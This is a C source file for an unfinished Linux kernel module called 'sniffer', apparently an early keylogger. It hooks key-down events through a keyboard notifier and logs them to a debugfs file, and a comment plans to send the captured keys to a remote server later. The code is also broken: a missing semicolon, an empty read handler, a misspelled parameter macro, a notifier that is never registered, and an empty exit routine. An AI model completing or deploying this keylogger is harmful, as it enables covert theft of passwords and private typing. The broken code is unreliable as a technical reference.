#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>

#define CHUNK_LEN 12
#define BUF_LEN (PAGE_SIZE << 2)
#define US 0

static int codes;

//global variable and module parameter
module_param(codes, int, 0644);
MODULE_PARAM_DESC(codes, "format: 0");

static struct dentry *file;
static struct dentry *subdir;

static int keys_pressed(struct notifier_block *nblock,
                        unsigned long code,
                        void *_param);
                      
static ssize_t dev_read(struct file *filp,
                        char *buffer,
                        size_t len,
                        loff_t *offset){
                        //TODO
 }                      
                        
// Initializing the norifier block
static struct notifier_block nb = {
        .notifier_call = keys_pressed
};

const struct file_operations keys_fops= {
         .owner = THIS_MODULE,
         .read = dev_read,
};           
                        
int keys_pressed(struct notifier_block *nblock, unsigned long code, 
                        void *_param){
        size_t len;
        char keybuf[CHUNK_LEN] = {0};
        struct keyboard_notifier_param *param = _param;
        
        // Interested when a key is pressed down
        if (!(param->down)){
            return NOTIFY_OK
        }

}                      
static int __init sniffer_init(void){
    // set up log diretory
    // I'm using debugfs rn for testing, future feature should be able
    // to send to remote server
    // change the name later
    subdir = debugfs_create_dir("sniffer", NULL);
    if(IS_ERR(subdir)){
        return PTR_ERR(subdir);
    }
    
    if(!subdir){
        return -ENOENT;
    }
    
    // log file
    file = debugfs_create_file("logs", 0400, subdir, NULL, &keys_fops);
    if(!file){
        debugfs_remove_recursive(subdir);
        return -ENOENT;
    }
    
    
    return 0;
}

static void __exit sniffer_exit(void){

}

module_init(sniffer_init);
module_exit(sniffer_exit);
